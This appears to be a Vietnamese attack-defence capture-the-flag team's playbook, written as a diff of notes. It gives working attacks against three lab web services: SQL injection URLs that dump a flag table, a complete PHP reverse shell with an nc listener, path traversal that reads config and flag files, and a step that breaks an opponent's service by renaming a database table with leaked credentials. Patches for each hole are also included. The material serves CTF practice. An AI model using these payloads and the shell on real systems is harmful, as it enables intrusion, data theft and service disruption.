@@ -1,0 +1,200 @@
+SSH:
+ssh team1_1@160.250.132.171 -p 10001 -L 9001:10.50.2.10:80 -L 9002:10.50.2.10:81 -L 9003:10.50.2.10:82
+
+
+
+
+Service 1
+TẤN CÔNG
+ssh team1_1@160.250.132.171 -p 10001 -L 9001:10.50.2.10:80
+
+http://localhost:9001/admin/ (cblake/cblake123)
+ 
+test lỗi bằng cách them ' vào tham số id
+http://localhost:9001/admin/?page=students/view_student&id=1'
+
+Thử UNION SELECT với 15 cột giả để tìm số cột thực tế
+http://localhost:9001/admin/?page=students/view_student&id=-1'%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15--%20-
+
+Lấy Flag từ bảng flag_storage. Sử dụng UNION SELECT và GROUP_CONCAT để hiển thị giá trị cột flag trên trang, thu được flag.
+http://localhost:9001/admin/?page=students/view_student&id=-1'%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,GROUP_CONCAT(flag)%20FROM%20flag_storage--%20-
+
+Vá
+
+tcpdump -i eth0 -s 512 -nn -vvv -A 'dst host 10.50.1.10 and (tcp port 80 or tcp port 81 or tcp port 82)'
+
+/var/www/service1/admin/students/view_student.php
+ Thay:
+$qry = $conn->query("SELECT *, CONCAT(lastname,', ', firstname,' ', middlename) as fullname FROM student_list where id = '{$_GET['id']}'");
+Bằng:
+if(isset($_GET['id'])){
+    $id = $_GET['id'];
+    $stmt = $conn->prepare("SELECT *, CONCAT(lastname,', ', firstname,' ', middlename) as fullname FROM student_list where id = ?");
+    if ($stmt) {
+        $stmt->bind_param("i", $id);
+        $stmt->execute();
+        $qry = $stmt->get_result();
+        if($qry->num_rows > 0){
+            $res = $qry->fetch_array();
+            foreach($res as $k => $v){
+                if(!is_numeric($k)) $$k = $v;
+            }
+        }
+        $stmt->close(); 
+    }
+}
+
+
+
+SERVICE 3 – BLOCK PUZZLE
+Tấn công
+ssh -L 9003:10.50.2.10:82 team1_2@160.250.132.171 -p 10001
+
+http://localhost:9003/
+
+nano shell.php
+<?php
+// Simple PHP Reverse Shell - clean & stable
+set_time_limit(0);
+$ip = '10.50.2.10';     // CHANGE THIS
+$port = 4444;        // CHANGE THIS
+
+$sock = fsockopen($ip, $port);
+if (!$sock) { die(); }
+
+$proc = proc_open('/bin/sh -i', [
+    0 => ['pipe', 'r'],
+    1 => ['pipe', 'w'],
+    2 => ['pipe', 'w']
+], $pipes);
+
+while (true) {
+    if (feof($sock)) break;
+    if (feof($pipes[1])) break;
+
+    $read = [$sock, $pipes[1], $pipes[2]];
+    $write = null;
+    $except = null;
+    if (stream_select($read, $write, $except, 0) === false) break;
+
+    foreach ($read as $r) {
+        if ($r === $sock) {
+            $input = fread($sock, 1024);
+            fwrite($pipes[0], $input);
+        } elseif ($r === $pipes[1] || $r === $pipes[2]) {
+            $input = fread($r, 1024);
+            fwrite($sock, $input);
+        }
+    }
+}
+fclose($sock);
+fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]);
+proc_close($proc);
+?>
+
+#Nghe reverse connection 
+nc -lnvp 4444
+
+#dùng pwd để xem vị trí hiện tại: /var/www/service3/uploads , flag nằm trong /var/www/service3/flags
+cd ../flags
+ls
+cat flag_X.txt
+
+
+
+Vá Lỗi SERVICE 3 (Patch)
+cd /var/www/service3/src/uploads
+nano .htaccess
+
+
+# Không cho Apache xử lý PHP trong thư mục uploads
+php_flag engine off
+
+# Tháo handler .php nếu có
+RemoveHandler .php
+RemoveType .php
+RemoveType application/x-httpd-php
+
+
+
+SERVICE 2 – SMS (Stock Management System)
+Tấn công
+ssh -L 9002:10.50.2.10:81 team1_2@160.250.132.171 -p 10001
+
+http://localhost:9002/admin/ (cblake/cblake)
+
+Dùng path traversal: đọc file cấu hình
+http://localhost:9002/backup_legacy.php?file=../config.php
+
+Flag được đặt trong thư mục flags
+curl "http://localhost:9002/backup_legacy.php?file=.flags/tick_6.flag" (Lấy flag)
+
+Làm down service
+
+http://localhost:9002/backup_legacy.php?file=../initialize.php
+mysql -u ctf -p -h 10.50.2.10
+Password: ctfpass
+
+USE sms_db2;
+RENAME TABLE system_info TO system_info_bak;
+
+VÁ
+/var/www/service2/backup_legacy.php
+<?php
+require_once 'config.php';
+
+$file = $_GET['file'] ?? '';
+$file = (string)$file;
+
+$client_ip = $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
+
+file_put_contents('/tmp/backup_legacy_ip.log',
+    date('c') . " backup_legacy from {$client_ip} file={$file}\n",
+    FILE_APPEND
+);
+
+// Chặn ../
+if (str_contains($file, '..')) {
+    http_response_code(400);
+    echo "Invalid path";
+    exit;
+}
+
+// Chỉ allow checker IP
+$checker_ip = "10.50.0.1";
+$flag_prefix = ".flags/";
+
+if (strncmp($file, $flag_prefix, strlen($flag_prefix)) === 0) {
+
+    if ($client_ip !== $checker_ip) {
+        http_response_code(404);
+        echo "File not found";
+        exit;
+    }
+
+    $rel = substr($file, strlen($flag_prefix));
+    $safe = basename($rel);
+    $full = realpath(FLAG_STORAGE_DIR . "/" . $safe);
+
+    if (!$full || !is_file($full)) {
+        http_response_code(404);
+        exit;
+    }
+
+    header("Content-Type: text/plain");
+    readfile($full);
+    exit;
+}
+
+// Download backup thường
+$bp = realpath(BACKUP_STORAGE_DIR . "/" . basename($file));
+if (!$bp || strpos($bp, realpath(BACKUP_STORAGE_DIR)) !== 0) {
+    http_response_code(404);
+    exit;
+}
+
+header("Content-Type: application/octet-stream");
+readfile($bp);
+
+mysql -u ctf -p
+Password: ctfpass
